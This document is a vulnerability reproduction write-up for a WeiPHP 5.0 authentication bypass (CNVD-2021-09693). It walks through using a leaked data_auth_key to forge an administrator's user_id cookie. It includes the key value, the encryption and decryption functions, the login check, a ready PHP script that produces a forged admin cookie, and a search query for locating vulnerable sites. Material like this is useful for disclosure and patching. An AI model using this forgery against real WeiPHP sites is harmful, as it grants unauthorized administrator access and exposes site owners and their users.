# WeiPHP5.0 Cookie forgery for any user CNVD-2021-09693

## Vulnerability Description

Weiphp5.0 There is a fake cookie for administrator user. Through the leaked key data, the administrator's cookie can be obtained by using encryption methods.

## Affect Version

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Weiphp <= 5.0</span>

## Environment construction

[Weiphp5.0 official download reference manual](https://www.weiphp.cn/doc/Initialization_database.html)

Just refer to the official manual to create a website

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-1.png)



## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="WeiPHP"</span>



## Vulnerability reappears

First, you need to get the `data_auth_key` key in the database configuration file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-15.png)



To get this configuration file, you can refer to the previous article `Weiphp5.0 front desk file arbitrarily read`



```plain
'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T'
```



Find the places where this key is used globally



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-16.png)



Found the encryption method and decryption method according to this key



`Encrypt method think_encrypt`



```php
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
```



`Decrypt method think_decrypt



```php
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire > 0 && $expire < time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
```



View the locations using the decryption method globally



The file `application\common.php` contains code using the decryption method, used for authentication



```php
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')->autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
```



According to the code obtained here, you can know that when `user_Id=1`, the key will be decrypted and the determination will be correct. If it is correct, you can log in to the system



We can log in to the system by encrypting the `user_id=1` locally using the encryption code to encrypt the cookie `user_id=1`.



```php
<?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?>
```



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-17.png)



Add `cookie: user_id=xxxxxxxxx` to log in successfully



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-18.png)



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-19.png)
